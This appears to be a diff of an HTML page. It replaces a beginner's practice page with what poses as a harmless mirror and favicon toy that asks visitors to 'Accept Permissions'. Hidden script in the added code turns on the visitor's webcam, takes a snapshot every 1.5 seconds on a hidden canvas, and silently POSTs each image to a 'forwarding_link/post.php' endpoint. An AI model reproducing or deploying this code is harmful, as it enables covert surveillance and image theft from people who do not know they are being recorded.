@@ -1,33 +1,83 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-    <head>
-        <title>D0ctor Dark</title>
-        <meta charset="UTF-8" >
-    </head>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
     <body>
-        <h1>this is my firth website</h1>
-        <p>khob in avalin matn is <b>WEBSITE</b> hast ke man daram <a href="test.html">minvisam</a>:LLL <br/> khooobe hala chi</p>
-        <iframe src="https://www.digikala.com/" width="500" height="400"></iframe>
-        <form>
-             <label for="gmail">write your gmail</label>
-            <input id="gmail" type="email"><br/>
-             <label for="password">write your passwrod</label>
-            <input id="password" type="password"><br/>
-            <input type="radio" name="jensiat" id="mard">
-            <label for="mard">mard</label>
-            <input type="radio" name="jensiat" id="zan">
-            <label for="zan">zan</label><br/>
-            <input type="submit" value="ersal"><br>
-            <select name="" id="">
-
-
-                <option value="">HTML</option>
-                <option value="">CSS</option>
-                <option value="">Java</option>
-                <option value="">Python</option>
-            </select>
-
-
-        </form>
+        <p>Hint: Look at the favicon</p>
+        <p>(Accept Permissions)</p>
+        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
     </body>
+
 </html>
